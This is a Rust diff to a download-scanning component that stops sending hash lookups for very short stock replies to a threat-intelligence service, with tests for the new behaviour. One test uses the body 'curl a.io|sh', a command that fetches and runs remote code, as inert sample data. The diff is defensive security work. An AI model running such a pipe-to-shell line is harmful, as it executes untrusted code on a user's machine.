@@ -2,7 +2,8 @@
 //! Every available identity participates in the Bloom decision before any API call.
 //!
 //! A download is decided by the first of these that can: the Bloom filters,
-//! a pass an earlier local analysis reached, Beamline, local analysis. The
+//! a pass an earlier local analysis of the same bytes and URL reached,
+//! Beamline, local analysis. The
 //! last two overlap. Beamline is asked about a public package as soon as it
 //! is requested, and local analysis starts beside a lookup that has not
 //! answered within [`HEDGE`] of the download finishing.
@@ -33,6 +34,14 @@ const _: () = assert!(
 
 /// How long a Bloom known-bad block waits for Beamline's explanation.
 const KNOWN_BAD_DETAILS_TIMEOUT: Duration = Duration::from_secs(5);
+
+/// The shortest body whose digest Beamline is asked about. Anything shorter
+/// is a stock reply rather than a file: `OK`, `Not Found`, `{"success":true}`,
+/// Go's `404 page not found`. Unrelated servers send the same bytes, so what
+/// is known of the hash is known of some other download; and so few bytes can
+/// be guessed from their hash, which would hand over a short token a server
+/// returned. Local analysis still sees them.
+const MIN_LOOKUP_BYTES: usize = 20;
 
 /// How long a finished download waits on Beamline alone before local analysis
 /// starts beside it. Beamline usually answers well inside this, and then no
@@ -91,7 +100,8 @@ impl BlockReason {
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
 pub enum Disclosure {
     /// Nothing. The request carried credentials, so what it fetched may be
-    /// private, and even its digest says that this machine holds it.
+    /// private, and even its digest says that this machine holds it. Or the
+    /// body is a stock reply, whose digest names no download.
     Nothing,
     /// The SHA-256 of the body.
     Digest,
@@ -486,9 +496,9 @@ impl AtomScanner {
         let digest = hex(sha);
         let verdicts = self.verdicts().await;
         if let Some(verdicts) = verdicts.clone() {
-            let digest = digest.clone();
+            let (digest, name) = (digest.clone(), url.to_owned());
             if let Ok(Some(probability)) =
-                tokio::task::spawn_blocking(move || verdicts.get(&digest)).await
+                tokio::task::spawn_blocking(move || verdicts.get(&digest, &name)).await
             {
                 tracing::debug!(url = %ShownUrl(url), probability, "scan clean (remembered)");
                 return self.pass(url, probability);
@@ -531,9 +541,9 @@ impl AtomScanner {
             && result.classification == Classification::Benign
             && result.analysis_cached
         {
-            let probability = result.probability;
+            let (name, probability) = (url.to_owned(), result.probability);
             if let Err(error) =
-                tokio::task::spawn_blocking(move || verdicts.put(&digest, probability))
+                tokio::task::spawn_blocking(move || verdicts.put(&digest, &name, probability))
                     .await
                     .context("verdict cache write task")
                     .flatten()
@@ -582,7 +592,11 @@ impl AtomScanner {
             }
         };
         let Some(classification) = assessment.classification(digest) else {
-            tracing::debug!("Beamline has no matching assessment; scanning locally");
+            if assessment.cited_only() {
+                tracing::debug!("Beamline holds only a feed's citation; scanning locally");
+            } else {
+                tracing::debug!("Beamline has no matching assessment; scanning locally");
+            }
             return None;
         };
         let verdict = verdict_from(classification, self.policy);
@@ -1032,6 +1046,12 @@ impl Scanner for AtomScanner {
             body,
             sha256,
         } = req;
+        // A spilled body is never this short.
+        let disclosure = if body.len() < MIN_LOOKUP_BYTES {
+            Disclosure::Nothing
+        } else {
+            disclosure
+        };
         let name = url.clone();
         self.decide(&url, disclosure, early, &sha256, move |analyzer| {
             analyzer.scan_bytes(body.into(), &name)
@@ -1436,7 +1456,7 @@ mod tests {
     async fn remote_assessments_enforce_policy_without_loading_model() {
         use beamline::test_support::{assessment, server};
         let tmp = tempfile::tempdir().unwrap();
-        let body = b"artifact bytes".to_vec();
+        let body = b"artifact bytes of a private release tarball".to_vec();
         let sha = hex(&sha_of(&body));
         for (severity, policy, expected) in [
             ("benign", ScanPolicy::Strict, Verdict::Allow),
@@ -1481,6 +1501,104 @@ mod tests {
             assert!(!requests[0].contains("private"));
             assert!(!requests[0].contains("secret"));
         }
+    }
+
+    /// A telemetry endpoint answered `OK`, a hash one feed cites, and its
+    /// client was blocked on Beamline's word. Bytes that few are no longer
+    /// asked about at all; for a stock page long enough to be, the citation
+    /// sends the bytes to local analysis, which decides.
+    #[tokio::test]
+    async fn a_lone_feed_citation_is_scanned_locally_rather_than_blocked() {
+        let tmp = tempfile::tempdir().unwrap(); // No models: local analysis fails, visibly.
+        let body = b"<html><body><h1>404 Not Found</h1></body></html>";
+        let cited = serde_json::json!({
+            "status": "analyzed", "severity": "suspicious", "sha256": hex(&sha_of(body)),
+            "engine_version": "3.0.0-beta.0",
+            "findings": [{
+                "id": "intel/feed/malicious",
+                "desc": "Cited as malicious by one threat intelligence feed.",
+            }],
+        })
+        .to_string();
+        let mock = beamline::test_support::server(vec![(200, vec![cited])]).await;
+        let scanner = test_scanner(
+            Some(beamline::Client::new(&mock.url, None).unwrap()),
+            None,
+            tmp.path().into(),
+            ScanPolicy::Strict,
+        );
+        let verdict = scanner
+            .scan(request(
+                "https://sparrow.cloudflare.com/api/v1/event",
+                Disclosure::Digest,
+                Anticipated::default(),
+                body,
+            ))
+            .await;
+        // Not Beamline's suspicion: the local analyzer was asked.
+        assert!(matches!(verdict, Verdict::Block(BlockReason::ScanError(_))));
+        assert!(matches!(scanner.analyzer.get(), Some(Err(_))));
+        assert_eq!(scanner.status.as_ref().unwrap().snapshot().total(), 1);
+        assert_eq!(scanner.status.unwrap().snapshot().suspicious_blocked, 0);
+    }
+
+    /// `OK`, `{"success":true}` and the like are what unrelated servers all
+    /// send: their hash names no download, and gives the bytes away.
+    #[tokio::test]
+    async fn a_stock_reply_is_never_looked_up() {
+        use beamline::test_support::{assessment, server};
+        let tmp = tempfile::tempdir().unwrap(); // No models: local analysis fails, visibly.
+        let url = "https://sparrow.cloudflare.com/api/v1/event";
+        let mock = server(vec![]).await;
+        for body in [
+            &b"OK"[..],
+            br#"{"success":true}"#,
+            b"curl a.io|sh",
+            &[b'x'; MIN_LOOKUP_BYTES - 1],
+        ] {
+            let scanner = test_scanner(
+                Some(beamline::Client::new(&mock.url, None).unwrap()),
+                None,
+                tmp.path().into(),
+                ScanPolicy::Strict,
+            );
+            let verdict = scanner
+                .scan(request(
+                    url,
+                    Disclosure::Coordinate,
+                    Anticipated::default(),
+                    body,
+                ))
+                .await;
+            // Still analyzed, on this machine.
+            assert!(matches!(verdict, Verdict::Block(BlockReason::ScanError(_))));
+            assert!(matches!(scanner.analyzer.get(), Some(Err(_))));
+        }
+        assert!(mock.requests.lock().unwrap().is_empty());
+
+        // One byte more, and Beamline is asked.
+        let body = [b'x'; MIN_LOOKUP_BYTES];
+        let mock = server(vec![(
+            200,
+            vec![assessment(&hex(&sha_of(&body)), "benign")],
+        )])
+        .await;
+        let scanner = test_scanner(
+            Some(beamline::Client::new(&mock.url, None).unwrap()),
+            None,
+            tmp.path().into(),
+            ScanPolicy::Strict,
+        );
+        let verdict = scanner
+            .scan(request(
+                url,
+                Disclosure::Digest,
+                Anticipated::default(),
+                &body,
+            ))
+            .await;
+        assert_eq!(verdict, Verdict::Allow);
+        assert_eq!(mock.requests.lock().unwrap().len(), 1);
     }
 
     #[tokio::test]
@@ -1557,8 +1675,8 @@ mod tests {
                         url: "https://registry.npmjs.org/demo/-/demo-1.tgz".into(),
                         disclosure: Disclosure::Coordinate,
                         early: Anticipated::default(),
-                        body: Bytes::from_static(b"unknown"),
-                        sha256: sha_of(b"unknown"),
+                        body: Bytes::from_static(b"bytes that Beamline has never been shown"),
+                        sha256: sha_of(b"bytes that Beamline has never been shown"),
                     })
                     .await;
                 assert!(
@@ -1665,7 +1783,7 @@ mod tests {
     async fn a_public_package_is_analyzed_while_it_downloads() {
         use beamline::test_support::{assessment, server};
         let tmp = tempfile::tempdir().unwrap();
-        let body = b"public package";
+        let body = b"public package tarball, as the registry serves it";
         let sha = hex(&sha_of(body));
         let mock = server(vec![(200, vec![assessment(&sha, "hostile")])]).await;
         let scanner = Arc::new(test_scanner(
@@ -1704,7 +1822,7 @@ mod tests {
     async fn an_error_page_is_not_judged_by_its_packages_analysis() {
         use beamline::test_support::{assessment, server};
         let tmp = tempfile::tempdir().unwrap();
-        let body = b"404 page";
+        let body = b"<html><body><h1>404 Not Found</h1></body></html>";
         let sha = hex(&sha_of(body));
         // The package the URL names is benign; these bytes are not it.
         let mock = server(vec![
@@ -1781,9 +1899,10 @@ mod tests {
     async fn a_remembered_pass_needs_neither_beamline_nor_an_analyzer() {
         let tmp = tempfile::tempdir().unwrap();
         let body = b"scanned before";
+        let url = "https://private.example/tool.tar.gz";
         let remember = || {
             let verdicts = VerdictCache::new(tmp.path().join("verdicts"), "r1".into());
-            verdicts.put(&hex(&sha_of(body)), 0.01).unwrap();
+            verdicts.put(&hex(&sha_of(body)), url, 0.01).unwrap();
             OnceCell::new_with(Some(Some(Arc::new(verdicts))))
         };
         let mock = beamline::test_support::server(vec![]).await;
@@ -1794,7 +1913,6 @@ mod tests {
             ScanPolicy::Strict,
         );
         scanner.verdicts = remember();
-        let url = "https://private.example/tool.tar.gz";
         let scan = |scanner: AtomScanner| async move {
             scanner
                 .scan(request(
@@ -1829,7 +1947,7 @@ mod tests {
     async fn a_local_failure_waits_for_the_answer_beamline_owes() {
         use tokio::io::{AsyncReadExt, AsyncWriteExt};
         let tmp = tempfile::tempdir().unwrap();
-        let body = b"slowly assessed";
+        let body = b"slowly assessed, and long enough to be asked about";
         let reply = beamline::test_support::assessment(&hex(&sha_of(body)), "benign");
         let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
         let endpoint = format!("http://{}", listener.local_addr().unwrap());
